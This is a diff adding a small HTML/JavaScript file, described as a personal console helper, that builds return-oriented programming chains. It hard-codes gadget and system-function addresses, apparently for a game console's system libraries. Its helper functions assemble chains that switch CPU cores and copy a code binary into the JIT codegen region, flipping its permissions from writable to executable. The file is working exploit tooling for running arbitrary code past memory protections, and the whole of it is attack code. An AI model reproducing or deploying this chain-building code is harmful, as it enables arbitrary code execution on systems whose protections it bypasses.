@@ -1,0 +1,131 @@
+<!--
+This is just something for me to use a console on chrome to form ROP chains
+-->
+<script>
+//Rop offset
+{
+    ROP_POPJUMPLR_STACK12 = 0x0101cd24;
+    ROP_POPJUMPLR_STACK20 = 0x01024d88;
+    ROP_CALLFUNC = 0x01080274;
+    ROP_CALLR28_POP_R28_TO_R31 = 0x0107dd70;
+    ROP_POP_R28R29R30R31 = 0x0101d8d4;
+    ROP_POP_R27 = 0x0101cb00;
+    ROP_POP_R24_TO_R31 = 0x010204c8;
+    ROP_CALLFUNCPTR_WITHARGS_FROM_R3MEM = 0x010253c0;
+    ROP_SETR3TOR31_POP_R31 = 0x0101cc10;
+
+    ROP_memcpy = 0x01035fc8;
+    ROP_DCFlushRange = 0x01023f88;
+    ROP_ICInvalidateRange = 0x010240b0;
+    ROP_OSSwitchSecCodeGenMode = 0x010376c0;
+    ROP_OSCodegenCopy = 0x010376d8;
+    ROP_OSGetCodegenVirtAddrRange = 0x010375c0;
+    ROP_OSGetCoreId = 0x01024e8c;
+    ROP_OSGetCurrentThread = 0x01043150;
+    ROP_OSSetThreadAffinity = 0x010429dc;
+    ROP_OSYieldThread = 0x010418e4;
+    ROP_OSFatal = 0x01031618;
+    ROP_Exit = 0x0101cd80;
+    ROP_OSScreenFlipBuffersEx = 0x0103afd0;
+    ROP_OSScreenClearBufferEx = 0x0103b090;
+    ROP_OSDynLoad_Acquire = 0x0102a3b4;
+    ROP_OSDynLoad_FindExport = 0x0102b828;
+    ROP_os_snprintf = 0x0102f160;
+}
+
+//Rop helper
+{
+    var ab = new ArrayBuffer(0x10000);
+    var ropCurrentDv = new DataView(ab)
+    var ropChain = new Uint32Array(ab);
+    var ropCurrentOffset = 0;
+
+    function ropchain_appendu32(val)
+    {
+        ropCurrentDv.setUint32(ropCurrentOffset, val);
+        ropCurrentOffset += 4;
+    }
+
+    function ropgen_pop_r24_to_r31(r24, r25, r26, r27, r28, r29, r30, r31)
+    {
+        ropchain_appendu32(ROP_POP_R24_TO_R31);
+        ropchain_appendu32(0x0);
+        ropchain_appendu32(0x0);
+
+        ropchain_appendu32(r24);
+        ropchain_appendu32(r25);
+        ropchain_appendu32(r26);
+        ropchain_appendu32(r27);
+        ropchain_appendu32(r28);
+        ropchain_appendu32(r29);
+        ropchain_appendu32(r30);
+        ropchain_appendu32(r31);
+
+        ropchain_appendu32(0x0);
+    }
+
+    function ropgen_callfunc(funcaddr, r3, r4, r5, r6, r28)
+    {
+        ropgen_pop_r24_to_r31(r6, r5, 0, ROP_CALLR28_POP_R28_TO_R31, funcaddr, r3, 0, r4);
+
+        ropchain_appendu32(ROP_CALLFUNC);
+
+        ropchain_appendu32(r28);//r28
+        ropchain_appendu32(0x0);//r29
+        ropchain_appendu32(0x0);//r30
+        ropchain_appendu32(0x0);//r31
+        ropchain_appendu32(0x0);
+    }
+
+    function ropgen_switchto_core1()
+    {
+        ropgen_callfunc(ROP_OSGetCurrentThread, 0x0, 0x2, 0x0, 0x0, ROP_OSSetThreadAffinity);//Set r3 to current OSThread* and setup r31 + the r28 value used by the below.
+
+        ropchain_appendu32(ROP_CALLR28_POP_R28_TO_R31);//ROP_OSSetThreadAffinity(<output from the above call>, 0x2);
+
+        ropchain_appendu32(ROP_OSYieldThread);//r28
+        ropchain_appendu32(0x0);//r29
+        ropchain_appendu32(0x0);//r30
+        ropchain_appendu32(0x0);//r31
+        ropchain_appendu32(0x0);
+
+        ropchain_appendu32(ROP_CALLR28_POP_R28_TO_R31);
+
+        ropchain_appendu32(0x0);//r28
+        ropchain_appendu32(0x0);//r29
+        ropchain_appendu32(0x0);//r30
+        ropchain_appendu32(0x0);//r31
+        ropchain_appendu32(0x0);
+    }
+
+    function ropgen_OSSwitchSecCodeGenMode(flag)//flag0 == RW- permissions, flag1 == R-X permissions.
+    {
+        ropgen_callfunc(ROP_OSSwitchSecCodeGenMode, flag, 0x0, 0x0, 0x0, 0x0);
+    }
+
+    function ropgen_memcpy(dst, src, size)
+    {
+        ropgen_callfunc(ROP_memcpy, dst, src, size, 0x0, 0x0);
+    }
+
+    function ropgen_DCFlushRange(addr, size)
+    {
+        ropgen_callfunc(ROP_DCFlushRange, addr, size, 0x0, 0x0, 0x0);
+    }
+
+    function ropgen_ICInvalidateRange(addr, size)
+    {
+        ropgen_callfunc(ROP_ICInvalidateRange, addr, size, 0x0, 0x0, 0x0);
+    }
+
+    function ropgen_copycodebin_to_codegen(codegen_addr, codebin_addr, codebin_size)
+    {
+        ropgen_OSSwitchSecCodeGenMode(0);
+        ropgen_memcpy(codegen_addr, codebin_addr, codebin_size);
+        ropgen_OSSwitchSecCodeGenMode(1);
+
+        ropgen_DCFlushRange(codegen_addr, codebin_size);
+        ropgen_ICInvalidateRange(codegen_addr, codebin_size);
+    }
+}
+</script>
